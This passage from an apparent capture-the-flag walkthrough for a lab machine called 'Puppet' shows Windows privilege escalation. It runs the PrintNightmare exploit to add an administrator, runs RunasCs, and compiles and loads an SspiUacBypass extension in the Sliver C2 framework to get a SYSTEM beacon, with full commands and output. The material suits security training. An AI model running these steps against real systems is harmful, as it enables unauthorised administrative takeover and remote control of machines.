[+] created payload at C:\Users\bruce.smith\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_0a3468baaae9fedd\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\bruce.smith\AppData\Local\Temp\nightmare.dll
PS C:\temp>
```

```bash
Import-Module .\CVE-2021-34527.ps1
```

```bash
PS C:\Temp> Import-Module .\CVE-2021-34527.ps1
Import-Module .\CVE-2021-34527.ps1
```

```bash
Invoke-Nightmare -NewUser "pedant" -NewPassword "PedantLovesPrinters123" -DriverName "LifeShort"
```

```bash
PS C:\temp> Invoke-Nightmare -NewUser "pedant" -NewPassword "PedantLovesPrinters123" -DriverName "LifeShort"
Invoke-Nightmare -NewUser "pedant" -NewPassword "PedantLovesPrinters123" -DriverName "LifeShort"
[+] created payload at C:\Users\bruce.smith\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_0a3468baaae9fedd\Amd64\mxdwdrv.dll"
[+] added user pedant as local administrator
[+] deleting payload from C:\Users\bruce.smith\AppData\Local\Temp\nightmare.dll
PS C:\temp> exit
```

Download [RunasCs](https://github.com/antonioCoco/RunasCs):

```bash
curl -L -o runascs.zip https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ curl -L -o runascs.zip https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 39889  100 39889    0     0   106k      0 --:--:-- --:--:-- --:--:--  106k
```

Unzip it and then upload it to the victim machine:

```bash
upload RunasCs.exe
```

```bash
sliver (BLUSHING_ERROR) > upload RunasCs.exe

[*] Wrote file to c:\temp\RunasCs.exe
```

use it to run `C:\ProgramData\Puppet\Puppet-update.exe`:

```bash
.\\RunasCs.exe adm1n P@ssw0rd "C:\\ProgramData\\Puppet\\Puppet-update.exe"
```

then upload it 
Exit the interactive shell and then navigate to `cd C:/programdata/puppet`:

```bash
cd C:/programdata/puppet
```

```bash
sliver (BLUSHING_ERROR) > cd C:/programdata/puppet

[*] C:\programdata\puppet
```

```bash
PS C:\temp> Invoke-Nightmare
Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\bruce.smith\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_0a3468baaae9fedd\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\bruce.smith\AppData\Local\Temp\nightmare.dll
PS C:\temp> .\\RunasCs.exe adm1n P@ssw0rd "C:\\ProgramData\\Puppet\\Puppet-update.exe"
.\\RunasCs.exe adm1n P@ssw0rd "C:\\ProgramData\\Puppet\\Puppet-update.exe"
[*] Warning: User profile directory for user adm1n does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'adm1n' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
[*] Beacon c0a382de BLUSHING_ERROR - 172.16.40.50:52944 (File01) - windows/amd64 - Sun, 28 Dec 2025 14:12:58 CET
```

```bash
sliver (BLUSHING_ERROR) > sa-whoami

[*] Tasked beacon BLUSHING_ERROR (547a92f3)

[+] BLUSHING_ERROR completed task 547a92f3

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName                SID
====================== ====================================
FILE01\adm1n    S-1-5-21-2946821189-2073930159-359736154-1000


GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
FILE01\None                                       Group                    S-1-5-21-2946821189-2073930159-359736154-513  Mandatory group, Enabled by default, Enabled group,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account and member of Administrators groupWell-known group         S-1-5-114
BUILTIN\Administrators                            Alias                    S-1-5-32-544
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group,
Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group,


Privilege Name                Description                                       State
============================= ================================================= ===========================
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
```

Clone [UAC-BOF-Bonanza](https://github.com/icyguider/UAC-BOF-Bonanza.git):

```bash
git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
Cloning into 'UAC-BOF-Bonanza'...
remote: Enumerating objects: 70, done.
remote: Counting objects: 100% (70/70), done.
remote: Compressing objects: 100% (54/54), done.
remote: Total 70 (delta 17), reused 63 (delta 15), pack-reused 0 (from 0)
Receiving objects: 100% (70/70), 137.84 KiB | 3.63 MiB/s, done.
Resolving deltas: 100% (17/17), done.
```

Cd into the dir and then copy `SspiUacBypass/` to `~/.sliver-client/extensions/`:

```bash
cp -rp SspiUacBypass/ ~/.sliver-client/extensions/
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 UAC-BOF-Bonanza]$ cp -rp SspiUacBypass/ ~/.sliver-client/extensions/
```

cd into there:

```bash
cd !$/SspiUacBypass
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 UAC-BOF-Bonanza]$ cd !$
cd ~/.sliver-client/extensions/
```

install dependencies:

```bash
sudo dnf config-manager --set-enabled crb

mingw64-gcc.x86_64 : MinGW Windows cross-compiler (GCC) for C for the win64 target
mingw64-gcc-c++.x86_64 : MinGW Windows cross-compiler for C++ for the win64 target
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 SspiUacBypass]$ sudo dnf config-manager --set-enabled crb
```

```bash
sudo dnf install mingw64-gcc.x86_64
```

```bash
sudo dnf install mingw64-gcc-c++.x86_64 -y
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 SspiUacBypass]$ sudo dnf install mingw64-gcc-c++.x86_64 -y
```

run make:

```bash
make
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 SspiUacBypass]$ make
mkdir -p bin
mkdir -p bin/standalone
x86_64-w64-mingw32-g++ -c src/SspiUacBypassBOF.cpp -w -o bin/SspiUacBypassBOF.o
x86_64-w64-mingw32-g++ src/standalone/SspiUacBypass.cpp src/standalone/CreateSvcRpc.cpp -static -lsecur32 -s -w -o bin/standalone/SspiUacBypass.exe
```

Load the extension:

```bash
extensions load /home/07cf599c8311a84b1d8c2ae8xK/.sliver-client/extensions/SspiUacBypass
```

```bash
sliver (BLUSHING_ERROR) > extensions load /home/07cf599c8311a84b1d8c2ae8xK/.sliver-client/extensions/SspiUacBypass

[*] Added SspiUacBypass command: Perform UAC bypass via SSPI Datagram Contexts
```

Use it against `C:\ProgramData\Puppet\puppet-update.exe`:

```bash
SspiUacBypass C:/programdata/puppet/puppet-update.exe
```

```bash
sliver (BLUSHING_ERROR) > SspiUacBypass C:/programdata/puppet/puppet-update.exe

[*] Successfully executed SspiUacBypass (coff-loader)
[*] Got output:

        SspiUacBypass - Bypassing UAC with SSPI Datagram Contexts
        by @splinter_code

Forging a token from a fake Network Authentication through Datagram Contexts
Network Authentication token forged correctly, handle --> 0x410
Forged Token Session ID set to 1. lsasrv!LsapApplyLoopbackSessionId adjusted the token to our current session
Bypass Success! Now impersonating the forged token... Loopback network auth should be seen as elevated now
Invoking CreateSvcRpc (by @x86matthew)
Connecting to \\127.0.0.1\pipe\ntsvcs RPC pipe
Opening service manager...
Creating temporary service...
Executing 'C:/programdata/puppet/puppet-update.exe' as SYSTEM user...
Deleting temporary service...
Finished


[*] Beacon 4d6e2ad9 BLUSHING_ERROR - 172.16.40.50:54238 (File01) - windows/amd64 - Sun, 28 Dec 2025 16:12:44 CET
```

Use the elevated beacon:

```bash
use 4d6e2ad9
```

```bash
[*] Beacon 4d6e2ad9 BLUSHING_ERROR - 172.16.40.50:54238 (File01) - windows/amd64 - Sun, 28 Dec 2025 16:12:44 CET

sliver (BLUSHING_ERROR) > use

? Select a session or beacon:  [Use arrows to move, type to filter]
  SESSION  de8a6578  BLUSHING_ERROR  172.16.40.50:50645  File01  PUPPET\bruce.smith   windows/amd64
  BEACON   0a65b915  BLUSHING_ERROR  172.16.40.50:49718  File01  PUPPET\bruce.smith   windows/amd64
  BEACON   478d8305  BLUSHING_ERROR  172.16.40.50:49716  File01  PUPPET\bruce.smith   windows/amd64
> BEACON   4d6e2ad9  BLUSHING_ERROR  172.16.40.50:54238  File01  NT AUTHORITY\SYSTEM  windows/amd64
  BEACON   6a271081  BLUSHING_ERROR  172.16.40.50:49714  File01  PUPPET\bruce.smith   windows/amd64
  BEACON   73303d28  BLUSHING_ERROR  172.16.40.50:49717  File01  PUPPET\bruce.smith   windows/amd64
  BEACON   8dfde865  BLUSHING_ERROR  172.16.40.50:52967  File01  <err>                windows/amd64
  ```

now we are administrator:

```bash
sliver (BLUSHING_ERROR) > sa-whoami

[*] Tasked beacon BLUSHING_ERROR (040de403)

[+] BLUSHING_ERROR completed task 040de403

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName                SID
====================== ====================================
PUPPET\FILE01$  S-1-5-18


GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  Enabled by default, Enabled group, Group owner,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
Mandatory Label\System Mandatory Level            Label                    S-1-16-16384                                  Mandatory group, Enabled by default, Enabled group,


Privilege Name                Description                                       State
============================= ================================================= ===========================
SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled
SeLockMemoryPrivilege         Lock pages in memory                              Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled
SeTcbPrivilege                Act as part of the operating system               Enabled
SeSecurityPrivilege           Manage auditing and security log                  Disabled
SeTakeOwnershipPrivilege      Take ownership of files or other objects          Disabled
SeLoadDriverPrivilege         Load and unload device drivers                    Disabled
SeSystemProfilePrivilege      Profile system performance                        Enabled
SeSystemtimePrivilege         Change the system time                            Disabled
SeProfileSingleProcessPrivilegeProfile single process                            Enabled
SeIncreaseBasePriorityPrivilegeIncrease scheduling priority                      Enabled
SeCreatePagefilePrivilege     Create a pagefile                                 Enabled
SeCreatePermanentPrivilege    Create permanent shared objects                   Enabled
SeBackupPrivilege             Back up files and directories                     Disabled
SeRestorePrivilege            Restore files and directories                     Disabled
SeShutdownPrivilege           Shut down the system                              Disabled
SeDebugPrivilege              Debug programs                                    Enabled
SeAuditPrivilege              Generate security audits                          Enabled
SeSystemEnvironmentPrivilege  Modify firmware environment values                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
SeUndockPrivilege             Remove computer from docking station              Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks                  Disabled
SeImpersonatePrivilege        Impersonate a client after authentication         Enabled
SeCreateGlobalPrivilege       Create global objects                             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                    Enabled
SeTimeZonePrivilege           Change the time zone                              Enabled
SeCreateSymbolicLinkPrivilege Create symbolic links                             Enabled
SeDelegateSessionUserImpersonatePrivilegeObtain an impersonation token for another user in the same sessionEnabled
```

The user is now Admin:

```bash
sliver (BLUSHING_ERROR) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM
```

Read the `Sleep` flag:

```bash
cat C:/Users/bruce.smith/Desktop/flag.txt
```

```bash


sliver (BLUSHING_ERROR) > cat C:/Users/bruce.smith/Desktop/flag.txt

PUPPET{1c1740d66f7071**********}
```

